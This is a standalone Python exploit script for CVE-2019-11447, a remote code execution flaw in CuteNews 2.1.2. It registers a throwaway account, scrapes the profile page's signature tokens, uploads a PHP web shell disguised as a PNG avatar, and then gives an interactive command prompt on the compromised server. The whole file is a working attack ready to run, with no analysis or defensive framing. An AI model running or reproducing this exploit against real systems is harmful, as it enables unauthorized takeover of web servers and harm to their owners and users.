import requests, sys, random, string, re
from bs4 import BeautifulSoup


def gen_random_charset():
    """
    This function is used to create a random charset.
    """
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10))


if len(sys.argv) != 2:
    print("* CVE-2019-11447 | CuteNews 2.1.2 - Remote Code Execution *\n")
    print("Usage: python3 exploit.py <rhost>")
    print("Example: python3 exploit.py http://world.bank:80")
    sys.exit()


rhost = sys.argv[1]

username = gen_random_charset()
password = gen_random_charset() + "123456"
email = gen_random_charset() + "@persian64.com"
register_url = f"{rhost}/CuteNews/index.php?register"

SESSION = requests.Session()


def register():
    data = {"action": "register", "regusername": username, "regnickname": username, "regpassword": password, "confirm": password, "regemail": email}
    try:
        req = SESSION.post(url=register_url, data=data, verify=False, timeout=20)
        if 'Dashboard' in req.text:
            print(f"[ REGISTERED ] Username: {username} | Password: {password}")
            print(70 * '-')
        else:
            sys.exit("[ - ] Sign up failed, exiting")
    except Exception as e:
        sys.exit(f"[ ! ] Exception occured: {e}")

    return username, password


def login():
    shell_name = f"{gen_random_charset()}.php"
    payload = b'\x89PNG\r\n\x1a\n<?php echo shell_exec($_GET["rce"]); ?>'
    creds = register()
    login_url = f"{rhost}/CuteNews/index.php"

    data = {"action": "dologin", "username": creds[0], "password": creds[1]}
    try:
        req = SESSION.post(url=login_url, data=data, verify=False, timeout=20)
    except Exception as e:
        sys.exit(f"[ ! ] Exception occured: {e}")

    # this variable is used to get some necessary data from source code of user's profile page
    profile = SESSION.get(f'{rhost}/CuteNews/index.php?mod=main&opt=personal')
    # this variable is used when sending POST data to upload shell
    profile_url = f'{rhost}/CuteNews/index.php?mod=main&opt=personal'

    if 'Dashboard' in req.text:
        print(f"[ + ] Login done using {creds[0]}:{creds[1]}")
        profile_source = BeautifulSoup(profile.text, "html.parser")
        signature_key = profile_source.find('input', {'name': '__signature_key'}).get('value')
        signature_dsi = profile_source.find('input', {'name': '__signature_dsi'}).get('value')

        data = {
            "mod": (None, "main"), "opt": (None, "personal"), "__signature_key": (None, signature_key),
            "__signature_dsi": (None, signature_dsi), "editpassword": (None, ""), "confirmpassword": (None, ""),
            "editnickname": (None, creds[0]), "avatar_file": (shell_name, payload), "more[site]": "", "more[about]": "",
        }

        try:
            request = SESSION.post(url=profile_url, files=data, verify=False, timeout=20)
            if 'User info updated!' in request.text:
                print("[ + ] Shell has been uploaded successfully.")
            else:
                sys.exit("[ - ] Shell upload failed, exiting")
        except Exception as e:
            sys.exit(f"[ ! ] Exception occured: {e}")

        shell_path = re.findall('<img src="(.*?)"', request.text)[0]

        while True:
            try:
                params = {'rce': input("Shell> ")}
                command = SESSION.get(url=shell_path, params=params, verify=False, timeout=10)
                print(command.text.split("\r\n\x1a\n")[1])
            except Exception as e:
                sys.exit(f"[ ! ] Exception occured: {e}")

    else:
        print("[ - ] Login failed, exiting")
        sys.exit()


login()
